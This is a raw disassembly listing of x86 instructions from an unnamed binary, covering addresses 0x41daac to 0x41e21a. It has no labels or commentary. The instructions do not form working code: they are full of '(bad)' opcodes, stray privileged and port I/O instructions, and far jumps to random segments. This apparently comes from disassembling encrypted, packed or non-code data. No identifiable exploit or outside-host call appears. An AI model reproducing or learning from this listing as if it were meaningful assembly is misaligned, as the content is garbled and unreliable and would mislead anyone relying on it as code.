  41daac:	xor    al,0xfd
  41daae:	add    dl,BYTE PTR [ebx+0xa]
  41dab1:	ins    BYTE PTR es:[edi],dx
  41dab2:	xchg   edx,eax
  41dab3:	loop   0x41dadc
  41dab5:	lods   eax,DWORD PTR ds:[esi]
  41dab6:	add    ebp,DWORD PTR [esi-0xfbbffa5]
  41dabc:	je     0x41dace
  41dabe:	pop    ecx
  41dabf:	aas    
  41dac0:	adc    al,0xf
  41dac2:	enter  0xf2dd,0x17
  41dac6:	repnz push 0x8
  41dac9:	(bad)  
  41daca:	dec    edi
  41dacb:	xchg   esp,eax
  41dacc:	push   ss
  41dacd:	test   DWORD PTR [edi-0x3b9e8d3d],esp
  41dad3:	cmc    
  41dad4:	test   ebp,esp
  41dad6:	std    
  41dad7:	adc    dl,BYTE PTR [esi-0x5ed6305]
  41dadd:	lds    edx,FWORD PTR [edx-0x2e25d652]
  41dae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dae4:	cmp    al,0x7e
  41dae6:	cld    
  41dae7:	sbb    al,ah
  41dae9:	xor    eax,0x748e2bb7
  41daee:	jne    0x41db4a
  41daf0:	lods   al,BYTE PTR ds:[esi]
  41daf1:	or     eax,DWORD PTR [ebx+0x65ccb7db]
  41daf7:	mov    ch,0x37
  41daf9:	test   al,0xd1
  41dafb:	push   0xffffff8e
  41dafd:	cld    
  41dafe:	and    eax,0x863d16f0
  41db03:	mov    al,ds:0x3b54e545
  41db08:	mov    bl,0xc3
  41db0a:	nop
  41db0b:	and    ecx,esi
  41db0d:	adc    eax,0xe2b838bc
  41db12:	xchg   esp,eax
  41db13:	cli    
  41db14:	sbb    edx,DWORD PTR ds:0x3c46d906
  41db1a:	push   ss
  41db1b:	xor    al,0xb3
  41db1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db1f:	(bad)
  41db22:	ret    
  41db23:	dec    edi
  41db24:	inc    esp
  41db25:	push   0x6
  41db27:	and    edx,edi
  41db29:	sub    DWORD PTR [ebx+ebx*8+0x1e],0xffffff8c
  41db2e:	aas    
  41db2f:	adc    BYTE PTR [ecx],0xb1
  41db32:	jp     0x41dae9
  41db34:	and    eax,0x5c6ae155
  41db39:	nop
  41db3a:	stos   DWORD PTR es:[edi],eax
  41db3b:	mov    bh,ch
  41db3d:	mov    ds:0x63d6ef23,al
  41db42:	(bad)  
  41db44:	repnz adc ecx,DWORD PTR [ebp+0x55]
  41db48:	lahf   
  41db49:	cmp    eax,0x969f5d45
  41db4e:	cmc    
  41db4f:	dec    eax
  41db50:	push   es
  41db51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db52:	call   0x7d5e:0xad4161af
  41db59:	sbb    al,0x53
  41db5b:	rcr    DWORD PTR [ecx*4+0x722c3003],1
  41db62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db63:	jge    0x41db5b
  41db65:	jb     0x41daed
  41db67:	jb     0x41db5f
  41db69:	pushf  
  41db6a:	mov    esp,0x45dc9af1
  41db6f:	jns    0x41db0d
  41db71:	push   0x7f
  41db73:	pop    edi
  41db74:	cwde   
  41db75:	cmp    eax,0x3ff366c8
  41db7a:	ins    BYTE PTR es:[edi],dx
  41db7b:	or     ecx,DWORD PTR cs:[edx+0xe7bf384]
  41db82:	pop    edx
  41db83:	pop    esp
  41db84:	mov    ah,0x3
  41db86:	xor    eax,0xfeeee158
  41db8b:	cld    
  41db8c:	dec    edi
  41db8d:	jle    0x41db1f
  41db8f:	fwait
  41db90:	lods   al,BYTE PTR ds:[esi]
  41db91:	(bad)  
  41db93:	inc    ebx
  41db94:	(bad)
  41db97:	sub    bl,ah
  41db99:	sub    BYTE PTR [edx+0x121e6513],ah
  41db9f:	hlt    
  41dba0:	mov    ecx,0x2e7e2e49
  41dba5:	lahf   
  41dba6:	pop    es
  41dba7:	mov    al,0xf8
  41dba9:	jae    0x41dc0d
  41dbab:	push   ss
  41dbac:	dec    ebx
  41dbad:	js     0x41db8e
  41dbaf:	shr    BYTE PTR [edx],cl
  41dbb1:	cmc    
  41dbb2:	jmp    0x41db37
  41dbb4:	push   ds
  41dbb5:	loope  0x41db87
  41dbb7:	sbb    al,0xbb
  41dbb9:	call   FWORD PTR [ebx]
  41dbbb:	sub    al,0xce
  41dbbd:	shl    BYTE PTR [ebp-0x5],1
  41dbc0:	nop
  41dbc1:	mov    bl,0x83
  41dbc3:	stos   BYTE PTR es:[edi],al
  41dbc4:	and    eax,0xd1edc625
  41dbc9:	jo     0x41dba6
  41dbcb:	xchg   BYTE PTR [ecx+0xaaee4cf],dh
  41dbd1:	lea    edi,[esi]
  41dbd3:	dec    eax
  41dbd4:	in     eax,0xc
  41dbd6:	shl    BYTE PTR [edi+esi*2-0x343cb8f5],0xe6
  41dbde:	ret    
  41dbdf:	jl     0x41dc02
  41dbe1:	pop    es
  41dbe2:	adc    eax,0x387ffb43
  41dbe7:	lods   al,BYTE PTR ds:[esi]
  41dbe8:	xchg   DWORD PTR [edx+ecx*4],ebp
  41dbeb:	(bad)  
  41dbec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbed:	sbb    al,0x90
  41dbef:	neg    esi
  41dbf1:	fucom  st(2)
  41dbf3:	outs   dx,BYTE PTR ds:[esi]
  41dbf4:	jge    0x41dc4c
  41dbf6:	mov    BYTE PTR [eax+ebp*8-0x41],al
  41dbfa:	adc    bh,BYTE PTR [edi+0x61e40f3]
  41dc00:	je     0x41db8d
  41dc02:	ss jnp 0x41db8f
  41dc05:	push   ebx
  41dc06:	iret   
  41dc07:	and    BYTE PTR [ebx+esi*2-0x70b60546],bh
  41dc0e:	rcr    DWORD PTR [ecx-0x18],cl
  41dc11:	test   eax,0x3ce522ef
  41dc16:	ins    BYTE PTR es:[edi],dx
  41dc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc18:	(bad)  
  41dc19:	(bad)  
  41dc1a:	push   ebp
  41dc1b:	popf   
  41dc1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc1d:	push   cs
  41dc1e:	lahf   
  41dc1f:	cwde   
  41dc20:	mov    eax,ds:0x79c016ee
  41dc25:	push   esi
  41dc26:	aam    0x14
  41dc28:	ror    DWORD PTR [ebx],cl
  41dc2a:	jg     0x41dbf3
  41dc2c:	xchg   esp,eax
  41dc2d:	dec    ebp
  41dc2e:	std    
  41dc2f:	cmc    
  41dc30:	cmp    ebx,DWORD PTR [edi+0x7e]
  41dc33:	pop    ebp
  41dc34:	add    ecx,edx
  41dc36:	outs   dx,DWORD PTR ds:[esi]
  41dc37:	mov    es,WORD PTR [edi]
  41dc39:	lods   al,BYTE PTR ds:[esi]
  41dc3a:	xchg   ebx,eax
  41dc3b:	fs jnp 0x41dca3
  41dc3e:	mov    ecx,DWORD PTR [ebx-0x56ea9012]
  41dc44:	test   eax,0x8d925edb
  41dc49:	adc    BYTE PTR [edx+0x213458ec],dh
  41dc4f:	fist   DWORD PTR [ebp-0x53]
  41dc52:	xor    BYTE PTR [edx-0x5b],ch
  41dc55:	(bad)  
  41dc56:	jmp    0x711c4656
  41dc5b:	test   al,0xb8
  41dc5d:	jmp    0x41dccb
  41dc5f:	mov    ebp,0x68308235
  41dc64:	repnz cli 
  41dc66:	mov    al,ds:0x42433619
  41dc6b:	repnz arpl WORD PTR [esi-0x4e],si
  41dc6f:	pushf  
  41dc70:	(bad)  
  41dc71:	sbb    ebx,esp
  41dc73:	adc    ah,BYTE PTR [esi-0x310d03c]
  41dc79:	aaa    
  41dc7a:	inc    edx
  41dc7b:	and    eax,esp
  41dc7d:	jno    0x41dcd4
  41dc7f:	add    BYTE PTR [eax],al
  41dc81:	push   ebx
  41dc82:	arpl   WORD PTR [ebx-0x478f2bed],dx
  41dc88:	pop    esi
  41dc89:	mov    ds:0x7b4072d,al
  41dc8e:	sbb    al,0x16
  41dc90:	pushf  
  41dc91:	cmp    BYTE PTR [ebp-0x11815d3c],ah
  41dc97:	movd   DWORD PTR [edi],mm6
  41dc9a:	leave  
  41dc9b:	jl     0x41dc76
  41dc9d:	push   ebx
  41dc9e:	popf   
  41dc9f:	cli    
  41dca0:	das    
  41dca1:	ins    BYTE PTR es:[edi],dx
  41dca2:	mov    ebp,0x2826ddf9
  41dca7:	mov    dl,0xc5
  41dca9:	fnstenv [edx+0x734ba155]
  41dcaf:	jne    0x41dcaf
  41dcb1:	into   
  41dcb2:	outs   dx,BYTE PTR ds:[esi]
  41dcb3:	xchg   edi,eax
  41dcb4:	dec    eax
  41dcb5:	sbb    DWORD PTR [eax-0x2cf3163f],0xf3619ea0
  41dcbf:	push   ebx
  41dcc0:	cld    
  41dcc1:	jbe    0x41dce5
  41dcc3:	popa   
  41dcc4:	inc    edi
  41dcc5:	in     eax,dx
  41dcc6:	fisub  DWORD PTR [esi-0x64]
  41dcc9:	out    dx,al
  41dcca:	add    ch,BYTE PTR [ecx+edi*8]
  41dccd:	pop    esi
  41dcce:	clc    
  41dccf:	dec    eax
  41dcd0:	push   ebp
  41dcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcd2:	add    BYTE PTR [edi+0x3d1e731e],al
  41dcd8:	push   ds
  41dcd9:	xor    dh,al
  41dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcdc:	push   eax
  41dcdd:	rol    ax,0x92
  41dce1:	lahf   
  41dce2:	dec    edx
  41dce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dce4:	mov    BYTE PTR [ebp-0x19],bl
  41dce7:	icebp  
  41dce8:	xor    BYTE PTR [esi-0x2b31184a],0x14
  41dcef:	scas   eax,DWORD PTR es:[edi]
  41dcf0:	lods   al,BYTE PTR ds:[esi]
  41dcf1:	fild   QWORD PTR [ebx+ecx*1-0x28]
  41dcf5:	push   ecx
  41dcf6:	push   ds
  41dcf7:	dec    ecx
  41dcf8:	cmp    al,0xa7
  41dcfa:	xchg   ebx,eax
  41dcfb:	push   es
  41dcfc:	(bad)  
  41dcfd:	mov    eax,ds:0x787558b2
  41dd02:	fmul   st(4),st
  41dd04:	fucomi st,st(3)
  41dd06:	mov    fs,WORD PTR [ecx]
  41dd08:	fsub   DWORD PTR [edx-0x2a65ebec]
  41dd0e:	hlt    
  41dd0f:	test   BYTE PTR [edi+0x7b],0x29
  41dd13:	ds mov eax,0xbf8e8af6
  41dd19:	jmp    0x17cc3014
  41dd1e:	jne    0x41dced
  41dd20:	outs   dx,DWORD PTR ds:[esi]
  41dd21:	mov    al,ds:0x76ca5fd9
  41dd26:	or     ecx,ebx
  41dd28:	xchg   ebp,eax
  41dd29:	sbb    dl,BYTE PTR [esi+0x5]
  41dd2c:	clc    
  41dd2d:	mov    WORD PTR [eax+0x3d],cs
  41dd30:	daa    
  41dd31:	stos   BYTE PTR es:[edi],al
  41dd32:	rol    BYTE PTR [eax-0x25],1
  41dd35:	in     al,dx
  41dd36:	or     eax,edi
  41dd38:	imul   edx,DWORD PTR [edx+eiz*4],0x90d09c8
  41dd3f:	sub    al,0x2b
  41dd41:	mov    ds:0xc5c508ee,al
  41dd46:	fld    DWORD PTR [ebp-0x201d3503]
  41dd4c:	mov    eax,0xa89b17e7
  41dd51:	mov    bh,0x95
  41dd53:	jne    0x41ddce
  41dd55:	or     DWORD PTR [ecx+0x36],eax
  41dd58:	pop    eax
  41dd59:	cmc    
  41dd5a:	fisttp WORD PTR [esi]
  41dd5c:	sbb    eax,0x6096c151
  41dd61:	scas   al,BYTE PTR es:[edi]
  41dd62:	aas    
  41dd63:	mov    WORD PTR [edx+0x5e01e08e],cs
  41dd69:	cmp    ebx,edx
  41dd6b:	in     eax,0xe3
  41dd6d:	addr16 jmp 0x1200:0x2e02374
  41dd75:	mov    esp,0x741e686e
  41dd7a:	mov    ecx,0xce8f8023
  41dd7f:	and    al,0x67
  41dd81:	enter  0xfa21,0x60
  41dd85:	out    0x8b,al
  41dd87:	lahf   
  41dd88:	xor    eax,0xd591ba18
  41dd8d:	push   ecx
  41dd8e:	adc    DWORD PTR [esp+ebp*2+0x50],ecx
  41dd92:	loope  0x41dd1d
  41dd94:	out    0xbb,al
  41dd96:	(bad)  
  41dd97:	cmp    ah,dl
  41dd99:	les    edx,FWORD PTR [edx-0x1]
  41dd9c:	dec    eax
  41dd9d:	sub    eax,0x339d48bb
  41dda2:	mov    bh,dl
  41dda4:	inc    edi
  41dda5:	mov    esp,0xf5cd25cf
  41ddaa:	jle    0x41dd9a
  41ddac:	call   0xae47d944
  41ddb1:	push   0x54
  41ddb3:	data16 ins BYTE PTR es:[edi],dx
  41ddb5:	pop    ebx
  41ddb6:	mov    es,WORD PTR [esi]
  41ddb8:	push   edi
  41ddb9:	adc    al,0x5b
  41ddbb:	(bad)  
  41ddbc:	popa   
  41ddbd:	sub    BYTE PTR [edi],dl
  41ddbf:	inc    ecx
  41ddc0:	jnp    0x41ddda
  41ddc2:	sbb    ecx,edx
  41ddc4:	sbb    BYTE PTR ds:0xed5b0907,cl
  41ddca:	xor    al,0x12
  41ddcc:	sub    BYTE PTR gs:[esi+edx*1],al
  41ddd0:	aaa    
  41ddd1:	imul   BYTE PTR [edi+0x3fc86279]
  41ddd7:	push   edi
  41ddd8:	jmp    0x41dddd
  41ddda:	sub    dh,BYTE PTR [edx+edi*8+0x7208b56]
  41dde1:	mov    ebx,0x1f62f4cc
  41dde6:	mov    bh,0x61
  41dde8:	push   ebx
  41dde9:	popa   
  41ddea:	xchg   ecx,eax
  41ddeb:	call   0xd025:0x6a3a5f9b
  41ddf2:	adc    eax,0xa0a6ccea
  41ddf7:	adc    al,0xd0
  41ddf9:	hlt    
  41ddfa:	mov    ah,0xb2
  41ddfc:	aas    
  41ddfd:	or     BYTE PTR [ecx-0x457b4c1a],cl
  41de03:	pop    esp
  41de04:	xchg   ecx,eax
  41de05:	cli    
  41de06:	(bad)  
  41de07:	fild   WORD PTR [ebp+0x61d837d1]
  41de0d:	cmp    BYTE PTR [esi],dl
  41de0f:	repz mov edx,0x7aa035fa
  41de15:	test   al,0xdb
  41de17:	pop    esp
  41de18:	out    dx,al
  41de19:	test   dh,al
  41de1b:	shl    BYTE PTR [ebp-0x28],0x3f
  41de1f:	repz add eax,0x6e3a7d27
  41de25:	pop    ebx
  41de26:	mov    al,0x55
  41de28:	mov    ebx,0x8139338f
  41de2d:	ret    0xa4cf
  41de30:	repnz mov al,ds:0x51dc032
  41de36:	dec    ebp
  41de37:	mov    esp,0x7857de62
  41de3c:	call   0x8722:0xb2673733
  41de43:	lahf   
  41de44:	imul   edx,DWORD PTR [esi+0x17c76d8b],0xffffff9e
  41de4b:	js     0x41de61
  41de4d:	adc    eax,0x30661659
  41de52:	xor    DWORD PTR [eax],0x32199154
  41de58:	inc    edi
  41de59:	jmp    0x41deb8
  41de5b:	repnz std 
  41de5d:	loop   0x41de94
  41de5f:	sbb    ah,BYTE PTR [ecx]
  41de61:	dec    ecx
  41de62:	push   es
  41de63:	add    dl,BYTE PTR [ebx+eiz*4-0x3bb761db]
  41de6a:	shl    DWORD PTR [ebp-0x4b7c7559],0x35
  41de71:	pop    esp
  41de72:	or     bl,bh
  41de74:	stc    
  41de75:	lahf   
  41de76:	call   FWORD PTR [ecx-0x54e0d1e4]
  41de7c:	lock adc eax,0xed4a1507
  41de82:	adc    cl,BYTE PTR [edi-0x3488b4f4]
  41de88:	aam    0x30
  41de8a:	div    DWORD PTR [ebx-0x13]
  41de8d:	clc    
  41de8e:	test   eax,0x908b0f58
  41de93:	mov    ebp,0x561b0ca4
  41de98:	add    al,0xa1
  41de9a:	outs   dx,DWORD PTR ds:[esi]
  41de9b:	lds    ecx,FWORD PTR ds:0x47f74213
  41dea1:	or     DWORD PTR [edx],ebp
  41dea3:	add    al,0x9a
  41dea5:	das    
  41dea6:	or     BYTE PTR [ebp-0x79ee303e],0x73
  41dead:	mov    dh,0x21
  41deaf:	scas   al,BYTE PTR es:[edi]
  41deb0:	xor    edi,esi
  41deb2:	ss mov esi,0xa75b8cff
  41deb8:	or     DWORD PTR [ebx],ebx
  41deba:	ja     0x41defa
  41debc:	or     al,0x9a
  41debe:	int3   
  41debf:	mov    ecx,DWORD PTR [edx]
  41dec1:	pop    ecx
  41dec2:	in     al,0x12
  41dec4:	nop
  41dec5:	sbb    BYTE PTR [edx],0xec
  41dec8:	retf   
  41dec9:	jno    0x41de74
  41decb:	add    bh,BYTE PTR [ecx-0x2b]
  41dece:	in     eax,dx
  41decf:	xchg   ebx,eax
  41ded0:	repz pop edx
  41ded2:	mov    al,BYTE PTR [ebp+0x19]
  41ded5:	stos   BYTE PTR es:[edi],al
  41ded6:	test   BYTE PTR [edi],0x44
  41ded9:	cdq    
  41deda:	mov    DWORD PTR [ecx],ebp
  41dedc:	pop    eax
  41dedd:	test   ch,bl
  41dedf:	sysexit 
  41dee1:	mov    edi,fs
  41dee3:	inc    ebx
  41dee4:	addr16 test DWORD PTR [bp-0x60],esp
  41dee9:	xchg   ecx,eax
  41deea:	and    ecx,DWORD PTR [ecx]
  41deec:	jecxz  0x41de7a
  41deee:	and    al,0xca
  41def0:	jb     0x41df30
  41def2:	mov    eax,0x380391b1
  41def7:	aaa    
  41def8:	int    0x5d
  41defa:	sahf   
  41defb:	lahf   
  41defc:	jmp    0x9694a58d
  41df01:	xor    BYTE PTR [ecx+edi*8-0x24],0x23
  41df06:	pop    edx
  41df07:	out    dx,eax
  41df08:	gs jns 0x41de96
  41df0b:	xchg   edi,eax
  41df0c:	adc    dh,BYTE PTR [esi-0x48e58e1d]
  41df12:	sub    BYTE PTR [edx-0x3ea51216],al
  41df18:	push   0x1e125768
  41df1d:	aaa    
  41df1e:	scas   al,BYTE PTR es:[edi]
  41df1f:	mov    ebx,gs
  41df21:	jno    0x41defc
  41df23:	aad    0x46
  41df25:	(bad)  
  41df26:	ror    esp,1
  41df28:	dec    edx
  41df29:	push   0xffffffbe
  41df2b:	inc    ebx
  41df2c:	and    ah,BYTE PTR [edi]
  41df2e:	fnstsw WORD PTR [edi-0x68]
  41df31:	fs (bad) 
  41df33:	push   esp
  41df34:	mov    dh,0x98
  41df36:	inc    ebx
  41df37:	repz fmul QWORD PTR [edi]
  41df3a:	adc    eax,DWORD PTR [ecx-0x11]
  41df3d:	mov    cl,0x93
  41df3f:	or     DWORD PTR [ebp-0x69],0xffffffc8
  41df43:	cmp    al,0x7e
  41df45:	mov    esi,0x18046d37
  41df4a:	xor    bl,BYTE PTR fs:0xf481e92b
  41df51:	icebp  
  41df52:	in     al,0x67
  41df54:	out    dx,al
  41df55:	clc    
  41df56:	xor    cl,dl
  41df58:	mov    esi,0xfeada428
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	stos   BYTE PTR es:[edi],al
  41df5f:	les    esi,FWORD PTR [ebx+0x1bab2a2e]
  41df65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df66:	jg     0x41def0
  41df68:	mov    esp,0x4e59c068
  41df6d:	add    al,0xa6
  41df6f:	xor    DWORD PTR [ebx+0x57373fa7],edx
  41df75:	cmp    BYTE PTR [eax+edx*8],bh
  41df78:	dec    edx
  41df79:	std    
  41df7a:	dec    edi
  41df7b:	ficomp DWORD PTR [ecx]
  41df7d:	add    ch,BYTE PTR [ebp+0x2bd1546d]
  41df83:	sbb    DWORD PTR [edx+0x51],0xffffff91
  41df87:	and    eax,DWORD PTR [eax]
  41df89:	jbe    0x41dfc3
  41df8b:	jle    0x41df83
  41df8d:	cli    
  41df8e:	aas    
  41df8f:	aad    0x8b
  41df91:	fsubr  DWORD PTR [edx-0x1573a557]
  41df97:	push   edx
  41df98:	mov    ds:0xb725ffca,eax
  41df9d:	pushf  
  41df9e:	mov    ah,0xd9
  41dfa0:	cld    
  41dfa1:	adc    ebp,esp
  41dfa3:	arpl   si,bx
  41dfa5:	xchg   esi,eax
  41dfa6:	fmul   st(1),st
  41dfa8:	inc    cx
  41dfaa:	lods   eax,DWORD PTR ds:[esi]
  41dfab:	loopne 0x41e00d
  41dfad:	xchg   esi,eax
  41dfae:	pop    ss
  41dfaf:	call   0x92e2d3de
  41dfb4:	pop    esp
  41dfb5:	sub    BYTE PTR [ebp+0x55],0x25
  41dfb9:	xchg   ebx,eax
  41dfba:	enter  0xeae8,0xac
  41dfbe:	mov    eax,0xab942b58
  41dfc3:	les    edx,FWORD PTR [esi]
  41dfc5:	mov    ds:0x16fa8f5a,al
  41dfca:	mov    BYTE PTR [ecx],al
  41dfcc:	jmp    0x6c5b6dc0
  41dfd1:	jnp    0x41dfc1
  41dfd3:	arpl   WORD PTR [ebx],di
  41dfd5:	rcr    BYTE PTR [ebx],0xd0
  41dfd8:	pop    edx
  41dfd9:	add    DWORD PTR ds:0x92ae51d7,eax
  41dfdf:	test   BYTE PTR [esi],0x3f
  41dfe2:	mov    eax,ds:0x3c67b6b8
  41dfe7:	mov    edi,0xc6c928a3
  41dfec:	cwde   
  41dfed:	jg     0x41e005
  41dfef:	in     eax,0xa
  41dff1:	dec    ebp
  41dff2:	test   DWORD PTR [esi-0x811e4af],esp
  41dff8:	lods   al,BYTE PTR ds:[esi]
  41dff9:	call   0xeb97:0x2db27039
  41e000:	popf   
  41e001:	ret    0x4d97
  41e004:	or     DWORD PTR [ebx-0xb],0x822fedb8
  41e00b:	loopne 0x41e055
  41e00d:	retf   0x4090
  41e010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e011:	mov    ecx,0xcbb92e41
  41e016:	clc    
  41e017:	outs   dx,DWORD PTR fs:[esi]
  41e019:	mov    WORD PTR [edi-0x66],gs
  41e01c:	fist   WORD PTR [ebp+0x48]
  41e01f:	cmc    
  41e020:	mov    esi,?
  41e022:	mov    ds,WORD PTR [edx]
  41e024:	add    dl,bh
  41e026:	dec    ebx
  41e027:	mov    esp,0xa9e462be
  41e02c:	xchg   ch,cl
  41e02e:	call   0xbd91:0xfe08e9b6
  41e035:	int    0x35
  41e037:	les    ecx,FWORD PTR [esi+0x43e68fc9]
  41e03d:	mov    WORD PTR [ecx+0x47f2ef35],ss
  41e043:	mov    dh,0xe3
  41e045:	sub    DWORD PTR [esi],ecx
  41e047:	mov    esi,0x4d1a1bb
  41e04c:	pop    ebx
  41e04d:	fdivr  QWORD PTR [eax-0x63557efc]
  41e053:	mov    ebx,es
  41e055:	adc    bl,BYTE PTR [eax+0x56]
  41e058:	sub    BYTE PTR [edi],0xf1
  41e05b:	jmp    0x3155:0x8211997d
  41e062:	xor    ch,BYTE PTR [ecx-0x6b52e69e]
  41e068:	clc    
  41e069:	jp     0x41e0a5
  41e06b:	xchg   esi,eax
  41e06c:	lods   al,BYTE PTR ds:[esi]
  41e06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06e:	stos   BYTE PTR es:[edi],al
  41e06f:	add    al,0x17
  41e071:	mov    edi,0x72b1cfbd
  41e076:	or     dl,BYTE PTR [ecx+0x630483d2]
  41e07c:	push   0xfffffff6
  41e07e:	xchg   ebp,eax
  41e07f:	push   ebx
  41e080:	loopne 0x41e070
  41e082:	dec    edx
  41e083:	retf   
  41e084:	pop    esp
  41e085:	push   ebp
  41e086:	dec    edi
  41e087:	pop    es
  41e088:	push   eax
  41e089:	popf   
  41e08a:	and    DWORD PTR [ebp+0x22],ecx
  41e08d:	or     DWORD PTR [eax-0x41c28283],0x5
  41e094:	jb     0x41e063
  41e096:	and    eax,0xaf03d045
  41e09b:	pop    ebx
  41e09c:	cld    
  41e09d:	jns    0x41e087
  41e09f:	in     al,dx
  41e0a0:	pop    ebp
  41e0a1:	aad    0x86
  41e0a3:	int    0x26
  41e0a5:	ins    DWORD PTR es:[edi],dx
  41e0a6:	xchg   esi,eax
  41e0a7:	ins    BYTE PTR es:[edi],dx
  41e0a8:	dec    edi
  41e0a9:	and    al,0x9e
  41e0ab:	scas   al,BYTE PTR es:[edi]
  41e0ac:	inc    ebp
  41e0ad:	sbb    DWORD PTR [esi+0x76063857],ecx
  41e0b3:	(bad)
  41e0b7:	into   
  41e0b8:	in     eax,0xe
  41e0ba:	mov    ch,0xa1
  41e0bc:	pop    esp
  41e0bd:	inc    esi
  41e0be:	sti    
  41e0bf:	mov    bl,0x40
  41e0c1:	call   DWORD PTR [ebp+0x7d]
  41e0c4:	daa    
  41e0c5:	loop   0x41e0df
  41e0c7:	and    ebx,esp
  41e0c9:	les    edx,FWORD PTR [edi+0x73d5b7fe]
  41e0cf:	gs nop
  41e0d1:	pop    edi
  41e0d2:	call   0xbd38:0x58125a5d
  41e0d9:	mov    di,dx
  41e0dc:	inc    ecx
  41e0dd:	mov    eax,ds:0x7987e6c7
  41e0e2:	sub    BYTE PTR [esi+0x74],cl
  41e0e5:	cdq    
  41e0e6:	jbe    0x41e123
  41e0e8:	xchg   esp,eax
  41e0e9:	(bad)  
  41e0ea:	rcl    BYTE PTR [ebx-0x76],1
  41e0ed:	sub    ebp,ebx
  41e0ef:	repz es pop ds
  41e0f2:	sub    eax,0xc2109e8d
  41e0f7:	xor    al,0xd4
  41e0f9:	and    eax,0x7de3ae90
  41e0fe:	rcl    BYTE PTR [ebx-0xc0ab10d],0x7e
  41e105:	(bad)  
  41e106:	sub    cl,BYTE PTR [ebp+0x267cbf5f]
  41e10c:	inc    edx
  41e10d:	leave  
  41e10e:	fs shr cl,1
  41e111:	xor    DWORD PTR [eax-0x628bb6e0],esi
  41e117:	pop    esp
  41e118:	in     al,dx
  41e119:	inc    ecx
  41e11a:	inc    eax
  41e11b:	cmp    al,BYTE PTR ds:0xa1b3a8f4
  41e121:	pop    esp
  41e122:	xor    ah,BYTE PTR [edi+0x5c]
  41e125:	mov    ebx,0x1ab18168
  41e12a:	ins    BYTE PTR es:[edi],dx
  41e12b:	test   bl,cl
  41e12d:	call   0xb5ebc893
  41e132:	fadd   QWORD PTR ds:0x57358371
  41e138:	icebp  
  41e139:	das    
  41e13a:	out    0x5b,eax
  41e13c:	pop    ds
  41e13d:	or     al,0x38
  41e13f:	mov    ah,0xf7
  41e141:	sar    BYTE PTR [edi-0x25fe1dab],cl
  41e147:	loop   0x41e1ae
  41e149:	lods   eax,DWORD PTR ds:[esi]
  41e14a:	sbb    ecx,DWORD PTR [edi+0x7c]
  41e14d:	in     al,0xbe
  41e14f:	popa   
  41e150:	nop
  41e151:	lahf   
  41e152:	push   0x29
  41e154:	addr16 hlt 
  41e156:	mov    edi,0x230cd44e
  41e15b:	dec    edi
  41e15c:	adc    bh,BYTE PTR [edi]
  41e15e:	ret    0x627b
  41e161:	xchg   edx,eax
  41e162:	popf   
  41e163:	nop
  41e164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e165:	bound  edi,QWORD PTR [edx+ecx*2-0x6057f790]
  41e16c:	outs   dx,DWORD PTR ds:[esi]
  41e16d:	loop   0x41e18f
  41e16f:	nop
  41e170:	icebp  
  41e171:	inc    eax
  41e172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e173:	add    edx,ebx
  41e175:	dec    edi
  41e176:	add    DWORD PTR [edx],eax
  41e178:	fpatan 
  41e17a:	pop    ss
  41e17b:	mov    esi,0xdaa2d966
  41e180:	or     cl,BYTE PTR [eax]
  41e182:	jecxz  0x41e1de
  41e184:	in     eax,0xc6
  41e186:	jle    0x41e133
  41e188:	add    bh,BYTE PTR [esi+0x3f74df9e]
  41e18e:	cld    
  41e18f:	sub    al,0xa8
  41e191:	lock js 0x41e182
  41e194:	pushf  
  41e195:	xor    BYTE PTR [ecx+0x3f06b464],0x95
  41e19c:	add    eax,esp
  41e19e:	adc    DWORD PTR [esi],edi
  41e1a0:	inc    edi
  41e1a1:	jl     0x41e127
  41e1a3:	retf   0xe236
  41e1a6:	add    al,0xc4
  41e1a8:	ins    DWORD PTR es:[edi],dx
  41e1a9:	add    al,0xd7
  41e1ab:	out    0xee,al
  41e1ad:	fwait
  41e1ae:	lods   eax,DWORD PTR ds:[esi]
  41e1af:	and    al,0x86
  41e1b1:	sub    dl,dl
  41e1b3:	mov    bl,0x92
  41e1b5:	mov    bh,BYTE PTR [edx+0x5cdd26f]
  41e1bb:	sub    ebx,edx
  41e1bd:	ret    
  41e1be:	ja     0x41e1c6
  41e1c0:	sub    esp,edx
  41e1c2:	std    
  41e1c3:	push   cs
  41e1c4:	jb     0x41e224
  41e1c6:	fbld   TBYTE PTR [edx]
  41e1c9:	push   esi
  41e1ca:	out    0x8c,eax
  41e1cc:	add    esp,DWORD PTR [edx-0x391c1234]
  41e1d2:	xor    DWORD PTR [eax+eiz*4-0x5d],ebp
  41e1d6:	in     al,0xa
  41e1d8:	leave  
  41e1d9:	je     0x41e1a7
  41e1db:	jbe    0x41e1c7
  41e1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1de:	shr    BYTE PTR [ebx-0x7ee8fc02],cl
  41e1e4:	cmp    al,cl
  41e1e6:	add    al,0x7e
  41e1e8:	push   ecx
  41e1e9:	dec    esi
  41e1ea:	(bad)  
  41e1eb:	fisub  DWORD PTR [edx+0x3442fd07]
  41e1f1:	mov    edx,0x620e264d
  41e1f6:	repnz rcl DWORD PTR [edx+0x7c],cl
  41e1fa:	pop    edx
  41e1fb:	pop    ebp
  41e1fc:	(bad)  
  41e1ff:	test   DWORD PTR [edx+0x3],0x6fa8e295
  41e206:	adc    al,0x4a
  41e208:	jmp    0x8931:0x3c841744
  41e20f:	cmp    al,0x87
  41e211:	imul   DWORD PTR es:[ebp+0x18b7868e]
  41e218:	sbb    dl,al
  41e21a:	xor    BYTE PTR [ecx],0x84
